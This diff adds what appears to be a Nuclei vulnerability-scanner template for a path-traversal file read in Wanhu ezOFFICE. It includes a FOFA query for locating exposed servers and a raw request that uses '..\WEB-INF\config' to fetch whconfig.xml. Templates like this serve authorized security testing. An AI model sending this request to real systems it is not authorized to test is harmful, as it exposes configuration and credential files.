@@ -1,0 +1,25 @@
+id: wanhu-ezoffice-file-read
+
+info:
+  name: Wanhu Ezoffice File Read Vulnerability
+  author: zp857
+  severity: critical
+  tags: wanhu-ezoffice,lfi
+  metadata:
+    fofa-query: 'app="万户网络-ezOFFICE"'
+
+requests:
+  - raw:
+      - |
+        GET /defaultroot/DownloadServlet?key=&path=..\WEB-INF\config&FileName=whconfig.xml&name=whconfig.xml HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "EzOffice"
+
+      - type: status
+        status:
+          - 200
